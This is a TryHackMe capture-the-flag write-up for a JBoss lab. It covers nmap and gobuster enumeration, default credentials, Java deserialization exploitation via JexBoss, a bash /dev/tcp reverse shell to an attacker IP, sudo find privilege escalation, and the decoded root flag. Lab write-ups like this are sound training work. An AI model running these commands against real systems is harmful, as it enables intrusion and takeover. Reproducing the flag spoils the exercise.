---
title: "Tony The Tiger - THM"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2021-12-21 19:54:21 +05:30
categories: [Writeups, TryHackMe]
tags: [THM, JBoss, Java, Deserialization]
render_with_liquid: false
---

## Enumeration

- `nmap -Pn -p- --min-rate 2000 -sV 10.10.62.36`

```
Not shown: 65518 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
1090/tcp open  java-rmi    Java RMI
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
3873/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio?
5445/tcp open  smbdirect?
5455/tcp open  apc-5455?
5500/tcp open  hotline?
5501/tcp open  tcpwrapped
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8083/tcp open  http        JBoss service httpd
```

### GoBuster

```
gobuster dir -u http://10.10.62.36/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x php,java,txt -k

=======================================================================

/images      (Status: 301) [Size: 310] [==> http://10.10.62.36/images/]
/page        (Status: 301) [Size: 308] [==> http://10.10.62.36/page/]
/categories  (Status: 301) [Size: 314] [==> http://10.10.62.36/categories/]
/posts       (Status: 301) [Size: 309] [==> http://10.10.62.36/posts/]
/css         (Status: 301) [Size: 307] [==> http://10.10.62.36/css/]
/tags        (Status: 301) [Size: 308] [==> http://10.10.62.36/tags/]
/js          (Status: 301) [Size: 306] [==> http://10.10.62.36/js/]
/fonts       (Status: 301) [Size: 309] [==> http://10.10.62.36/fonts/]
```

---

## Exploitation

- http://10.10.62.36:8080/admin-console/ 
- `admin:admin` worked and logged me in but I couldn't find a way to upload anything so I went looking for exploits.
- There is an option to upload files like WAR, EAR, RAR, JAR in the Applications section in admin console but it didn't work and I could not get a reverse shell.
- `searchsploit JBoss`
- Google: JBoss AS 6 exploit
- [JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and Exploitation Tool](https://github.com/joaomatosf/jexboss)
- `git clone https://github.com/joaomatosf/jexboss`
- Create `venv` and `pip install -r requires.txt`
- `python jexboss.py -J admin:admin -u http://10.10.62.36:8080 -r 10.10.62.36:8080 -t`
- And we get a shell as user `cmnatic`.
- To get a proper netcat shell, I tried the following command and then upgraded the shell to get a stable shell.
- `nc -lvnp 443` 
- `shell> bash -i >& /dev/tcp/10.17.2.57/443 0>&1` 

---

## Privilege Escalation

- `/home/jboss` has a file `note` with `jboss` user's password in it.
- `jboss:likeaboss`
- `su jboss => likeaboss`
- `sudo -l => /usr/bin/find`
- GTFOBins: `sudo find . -exec /bin/bash \; -quit`
- `whoami` <span class="fat-arrow">=></span> `root`

- JBoss Configuration Files Location

```
https://docs.jboss.org/jbossas/guides/installguide/r1/en/html/config-files.html
```

```
cmnatic@thm-java-deserial:~/jboss/server/default$ cat conf/props/jmx-console-users.properties
# A sample users.properties file for use with the UsersRolesLoginModule
admin=admin
cmnatic@thm-java-deserial:~/jboss/server/default$ cat conf/props/jmx-console-roles.properties
# A sample roles.properties file for use with the UsersRolesLoginModule
admin=JBossAdmin,HttpInvoker
```

- `cat /root/root.txt`

```
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

- Go to CyberChef and Base64 Decode with URL Safe option.
- `BC77AC072EE30E3760806864E234C7CF`
- `zxcvbnm123456789`

